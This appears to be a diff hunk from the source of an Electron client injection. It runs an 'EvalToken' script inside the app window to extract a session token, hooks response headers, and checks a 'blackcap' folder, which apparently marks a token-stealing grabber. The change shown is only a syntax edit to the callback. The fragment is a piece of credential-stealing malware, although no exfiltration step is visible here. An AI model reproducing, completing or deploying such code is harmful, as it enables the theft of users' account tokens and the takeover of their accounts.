@@ -217,7 +217,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 async function FirstTime() {
     const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
+    window.webContents.executeJavaScript(`${EvalToken}`, !0).then(async (token) => {
 
         if (config['init-notify'] == "true") {
             if (fs.existsSync(path.join(__dirname, "blackcap"))) {
